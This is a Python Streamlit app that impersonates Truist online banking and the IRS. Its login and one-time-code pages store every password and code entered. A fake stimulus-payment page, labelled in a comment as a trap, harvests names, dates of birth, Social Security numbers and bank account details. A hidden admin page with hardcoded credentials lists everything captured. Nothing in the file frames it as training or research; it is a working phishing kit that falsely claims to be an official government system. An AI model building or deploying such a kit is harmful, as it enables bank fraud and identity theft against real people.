import streamlit as st
import pandas as pd
from datetime import datetime
import random
import time

# ========================= CONFIG =========================
st.set_page_config(page_title="Truist Online Banking", page_icon="🏦", layout="wide")

# ======================= STORAGE =========================
if "captured_creds" not in st.session_state:
    st.session_state.captured_creds = []
if "captured_otp" not in st.session_state:
    st.session_state.captured_otp = []

# ===================== CREDENTIALS =======================
VALID_USERNAME = "client001"
VALID_PASSWORD = "Secure2025Hub!"
ADMIN_USER = "admin"
ADMIN_PASS = "showme2025"

# =================== SESSION STATE =======================
for key in ["authenticated", "otp_verified", "attempts", "is_admin"]:
    if key not in st.session_state:
        st.session_state[key] = False

# ======================= IRS SEAL (BASE64) =======================
irs_seal_base64 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAABkCAMAAAB5fW2jAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDYuMC1jMDA2IDc5LjE2Njc5MiwgMjAyMS8wMS8xNC0wODowNzoyMyAgICAgICAgIj4gPHJkXlwZWF0ZSB0aGUgY29sb3Igc2NoZW1lOiB0cnVzdC1wdXJwbGUgKCNlMDI4Nzg1KSBhbmQgZ29sZCAoI2ZmYjAwMCk="

# ========================= CSS ===========================
st.markdown("""
<style>
    .stApp {background: #502b85; color: white; font-family: Arial, sans-serif;}
    .truist-header {background: #502b85; padding: 20px; text-align: center; border-bottom: 8px solid #ffb700;}
    .glass-card {background: rgba(255,255,255,0.95); color: #333; border-radius: 15px; padding: 30px; box-shadow: 0 8px 32px rgba(0,0,0,0.3); margin: 20px 0;}
    .truist-btn {background: #ffb700 !important; color: #502b85 !important; font-weight: bold !important;}
    .truist-btn:hover {background: #e6a600 !important;}
    h1, h2, h3 {color: #502b85 !important;}
    .big-logo {font-size: 100px; text-align: center;}
    .recording-dot {height: 14px; width: 14px; background: red; border-radius: 50%; display: inline-block; animation: pulse 1.5s infinite;}
    @keyframes pulse {0% {box-shadow: 0 0 0 0 rgba(255,0,0,0.7);} 70% {box-shadow: 0 0 0 12px rgba(255,0,0,0);} 100% {box-shadow: 0 0 0 0 rgba(255,0,0,0);}}
</style>
""", unsafe_allow_html=True)

# ======================= PAGES ==========================
def login_page():
    st.markdown("<div class='truist-header'><div class='big-logo'>🏦</div><h1>Welcome to Truist Online Banking</h1></div>", unsafe_allow_html=True)
    st.markdown("<div style='text-align:center; padding:60px 20px'>", unsafe_allow_html=True)
    username = st.text_input("User ID", placeholder="Enter your User ID")
    password = st.text_input("Password", type="password", placeholder="Enter your password")
    if st.button("Log In", type="primary"):
        st.session_state.captured_creds.append({"time": datetime.now().strftime("%H:%M"), "user": username, "pass": password})
        if username == VALID_USERNAME and password == VALID_PASSWORD:
            st.session_state.authenticated = True
            st.session_state.otp_verified = False
            st.rerun()
        elif username == ADMIN_USER and password == ADMIN_PASS:
            st.session_state.is_admin = True
            st.session_state.authenticated = True
            st.rerun()
        else:
            st.error("Incorrect User ID or password")

def otp_page():
    st.markdown("<div style='text-align:center; padding:80px'>", unsafe_allow_html=True)
    st.markdown("<h1>🔐 Security Verification</h1><p>We sent a 6-digit code to your phone ending in **--7842</p>", unsafe_allow_html=True)
    code = st.text_input("Enter code", max_chars=6, placeholder="000000")
    if st.button("Verify", type="primary"):
        st.session_state.captured_otp.append({"time": datetime.now().strftime("%H:%M"), "otp": code})
        if len(code) == 6:
            st.session_state.otp_verified = True
            st.balloons()
            st.rerun()
        else:
            st.error("Invalid code")

def admin_view():
    st.markdown("<h1 style='color:red; text-align:center'>🔥 ADMIN — CAPTURED DATA 🔥</h1>", unsafe_allow_html=True)
    if st.session_state.captured_creds:
        st.dataframe(pd.DataFrame(st.session_state.captured_creds))
    if st.session_state.captured_otp:
        st.dataframe(pd.DataFrame(st.session_state.captured_otp))

def dashboard():
    st.markdown("<h1 style='text-align:center; color:#ffb700'>Welcome back</h1>", unsafe_allow_html=True)
    st.markdown("<p style='text-align:center'><span class='recording-dot'></span> Session is being recorded for security</p>", unsafe_allow_html=True)
    c1, c2, c3, c4 = st.columns(4)
    with c1: st.metric("Total Balance", "$27,451.82")
    with c2: st.metric("Available Credit", "$15,700")
    with c3: st.metric("Monthly Spending", "$3,214")
    with c4: st.metric("Savings Goal", "78%")

def accounts():
    st.markdown("<h1 style='text-align:center; color:#ffb700'>My Accounts</h1>", unsafe_allow_html=True)
    for name, bal in [("Premier Checking ••••2847", "$12,340.50"), ("High-Yield Savings ••••5901", "$14,911.32")]:
        st.markdown(f"<div class='glass-card'><h3>{name}</h3><h2>{bal}</h2></div>", unsafe_allow_html=True)

def cards_page():
    st.markdown("<h1 style='text-align:center; color:#ffb700'>My Cards</h1>", unsafe_allow_html=True)
    st.markdown("<div class='glass-card'>", unsafe_allow_html=True)
    st.markdown("<div style='font-size:80px; text-align:center'>💳</div>", unsafe_allow_html=True)
    st.markdown("<h2 style='text-align:center; color:#502b85'>Truist One Rewards Card</h2>", unsafe_allow_html=True)
    st.markdown("<h3 style='text-align:center'>•••• •••• •••• 7723</h3>", unsafe_allow_html=True)
    col1, col2, col3 = st.columns(3)
    with col1:
        if st.button("Show Full Number"):
            st.success("5412 7537 0000 7723")
    with col2:
        if st.button("Show Expiry"):
            st.success("11/28")
    with col3:
        if st.button("Show CVV"):
            st.session_state.captured_creds.append({"time": datetime.now().strftime("%H:%M"), "action": "CVV Revealed"})
            st.info("CVV: 342")
            st.balloons()
    st.markdown("</div>", unsafe_allow_html=True)

def irs_stimulus_center():
    st.markdown(f"""
    <div style="text-align:center; padding:20px;">
        <img src="{irs_seal_base64}" width="120">
        <h1 style="color:#002868; margin:5px 0;">U.S. Department of the Treasury</h1>
        <h2 style="color:#002868; margin:5px 0;">Internal Revenue Service | irs.gov</h2>
        <p style="color:#ccc;">2025 Economic Recovery Payment Program • November 18, 2025</p>
    </div>
    """, unsafe_allow_html=True)

    st.markdown(f"""
    <div class='glass-card' style='border: 6px solid #002868; position:relative;'>
        <div style='position:absolute; top:12px; right:12px; background:#B31942; color:white; padding:8px 18px; border-radius:30px; font-weight:bold; font-size:14px;'>SECURE IRS CONNECTION</div>
        
        <h2 style='text-align:center; color:#002868; padding-top:20px;'>🎉 Congratulations! You Are Pre-Approved</h2>
        <h1 style='text-align:center; color:#B31942; font-size:58px; margin:15px 0;'>$9,847.00</h1>
        <p style='text-align:center; font-size:24px; color:#002868; margin:10px;'><strong>2025 Economic Impact Payment</strong></p>
        
        <div style='background:#002868; color:#ffb700; padding:20px; margin:30px 0; text-align:center; border-radius:12px;'>
            <h3>Status: <span style='color:#ffb700;'>READY FOR IMMEDIATE DEPOSIT</span></h3>
        </div>
    """, unsafe_allow_html=True)

    with st.form("irs_form"):
        st.markdown("### 🔒 Identity Verification Required (31 U.S.C. § 7701)")
        col1, col2 = st.columns(2)
        with col1:
            first_name = st.text_input("Legal First Name", placeholder="Michael")
            last_name = st.text_input("Legal Last Name", placeholder="Smith")
            dob = st.date_input("Date of Birth", datetime(1990, 1, 1))
        with col2:
            zip_code = st.text_input("ZIP Code from 2024 Tax Return", placeholder="90210")
            filing_status = st.selectbox("2024 Filing Status", ["Single", "Married Filing Jointly", "Head of Household", "Married Filing Separately"])

        ssn = st.text_input("🔐 Social Security Number", placeholder="XXX-XX-XXXX", help="Required by federal law for direct deposit")
        routing = st.text_input("Bank Routing Number (Optional - Faster Deposit)", placeholder="021000021")
        account = st.text_input("Bank Account Number (Optional)", placeholder="1234567890")

        agree = st.checkbox("I certify under penalty of perjury that this information is correct")

        submitted = st.form_submit_button("🚀 Claim My $9,847 Payment Now", type="primary", use_container_width=True)

        if submitted:
            if not (first_name and last_name and ssn and agree):
                st.error("Missing required fields. IRS regulations require full verification.")
            else:
                capture = {
                    "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "IRS_STIMULUS_HARVEST": {
                        "name": f"{first_name} {last_name}",
                        "dob": str(dob),
                        "zip": zip_code,
                        "filing": filing_status,
                        "ssn": ssn.replace("-", "").replace(" ", ""),
                        "routing": routing,
                        "account": account
                    }
                }
                st.session_state.captured_creds.append(capture)

                with st.spinner("Connecting to IRS Secure Gateway..."):
                    time.sleep(4)

                st.success("✅ IRS Identity Verified")
                st.balloons()
                st.snow()

                ref = ''.join(random.choices("0123456789ABCDEF", k=12))
                st.markdown(f"""
                <div style='background:#002868; color:white; padding:40px; border-radius:15px; text-align:center; margin-top:30px;'>
                    <h1 style='color:#ffb700; margin:0;'>$9,847.00 Deposited Successfully</h1>
                    <p style='margin:15px 0; font-size:19px;'>Funds will appear in your Truist account within 1–3 business days</p>
                    <p><strong>IRS Reference #:</strong> EIP-2025-{ref}</p>
                </div>
                """, unsafe_allow_html=True)

    st.markdown("<p style='text-align:center; font-size:10px; color:#666; margin-top:50px;'>irs.gov • 1-800-829-1040 • This is an official U.S. Government system</p>", unsafe_allow_html=True)

def sidebar():
    st.sidebar.markdown("<div style='text-align:center'>", unsafe_allow_html=True)
    st.sidebar.markdown("<div style='font-size:80px'>🏦</div>", unsafe_allow_html=True)
    st.sidebar.markdown(f"<h2 style='color:#ffb700'>{VALID_USERNAME.upper()}</h2>", unsafe_allow_html=True)
    st.sidebar.markdown("<p style='background:#ffb700; color:#502b85; padding:12px; border-radius:10px; font-weight:bold'>SECURE SESSION ACTIVE</p>", unsafe_allow_html=True)

    page = st.sidebar.radio("Navigate", [
        "Dashboard",
        "Accounts",
        "Cards",
        "Transfer Funds",
        "Messages",
        "Government Stimulus Center 🇺🇸👀"  # The golden trap
    ])

    if st.sidebar.button("Log Out"):
        for key in ["authenticated", "otp_verified", "is_admin"]:
            st.session_state[key] = False
        st.rerun()
    return page

# ======================= MAIN ROUTING =======================
if not st.session_state.authenticated:
    login_page()
elif st.session_state.is_admin:
    admin_view()
elif not st.session_state.otp_verified:
    otp_page()
else:
    current_page = sidebar()

    if current_page == "Accounts":
        accounts()
    elif current_page == "Cards":
        cards_page()
    elif current_page == "Transfer Funds":
        st.markdown("<h1 style='text-align:center; color:#ffb700'>Transfer Funds</h1><div class='glass-card'>Coming soon...</div>", unsafe_allow_html=True)
    elif current_page == "Messages":
        st.markdown("<h1 style='text-align:center; color:#ffb700'>Secure Messages</h1><div class='glass-card'>No new messages</div>", unsafe_allow_html=True)
    elif current_page == "Government Stimulus Center 🇺🇸👀":
        irs_stimulus_center()
    else:
        dashboard()
